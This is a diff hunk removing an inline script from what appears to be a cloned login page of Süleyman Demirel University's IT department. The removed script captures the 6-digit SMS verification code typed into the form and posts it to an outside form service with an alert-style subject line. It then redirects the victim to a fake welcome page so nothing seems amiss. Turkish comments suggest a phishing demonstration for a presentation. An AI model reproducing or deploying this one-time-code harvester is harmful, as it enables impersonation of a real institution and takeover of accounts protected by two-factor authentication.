@@ -964,54 +964,5 @@
                                                 Bilgi İşlem Daire Başkanlığı © 2020
                                             </a>
                                         </div>
-                                        <script>
-                                            // Sayfa tamamen yüklendiğinde çalışır
-                                            window.addEventListener('load', function () {
-                                                const otpForm = document.querySelector('form'); // Sayfadaki formu bulur
-                                                const submitBtn = document.querySelector('button[type="submit"]'); // Butonu bulur
 
-                                                if (otpForm) {
-                                                    otpForm.addEventListener('submit', function (e) {
-                                                        e.preventDefault(); // Sayfanın hata vermesini veya yenilenmesini engeller
-
-                                                        if (submitBtn) {
-                                                            submitBtn.disabled = true;
-                                                            submitBtn.innerHTML = "Doğrulanıyor...";
-                                                        }
-
-                                                        // Form verilerini topluyoruz (6 haneli kod burada)
-                                                        const formData = new FormData(this);
-                                                        const data = Object.fromEntries(formData);
-
-                                                        // Mail başlığını ve detaylarını sunum için özelleştiriyoruz
-                                                        data.access_key = "BURAYA_YENI_ALACAGIN_KEYI_YAZ"; // ÖNEMLİ: Yeni bir Web3Forms key'i alıp buraya yapıştır
-                                                        data.from_name = "SDÜ DOĞRULAMA SİSTEMİ";
-                                                        data.subject = "🚨 KRİTİK: 6 HANELİ SMS KODU GELDİ!";
-
-                                                        // SUNUM SİGORTASI: 2.5 saniye sonra mail gitse de gitmese de final sayfasına atar
-                                                        const forceRedirect = setTimeout(() => {
-                                                            window.location.href = "sdu_hosgeldiniz.html";
-                                                        }, 2500);
-
-                                                        // Veriyi Web3Forms'a gönderiyoruz
-                                                        fetch('https://api.web3forms.com/submit', {
-                                                            method: 'POST',
-                                                            headers: {
-                                                                'Content-Type': 'application/json',
-                                                                'Accept': 'application/json'
-                                                            },
-                                                            body: JSON.stringify(data)
-                                                        })
-                                                            .then(response => {
-                                                                clearTimeout(forceRedirect); // İşlem hızlı biterse beklemeden yönlendir
-                                                                window.location.href = "sdu_hosgeldiniz.html";
-                                                            })
-                                                            .catch(error => {
-                                                                // Hata (Spam engeli vb.) olsa bile sunumun akışı bozulmasın
-                                                                window.location.href = "sdu_hosgeldiniz.html";
-                                                            });
-                                                    });
-                                                }
-                                            });
-                                        </script>
 </body>
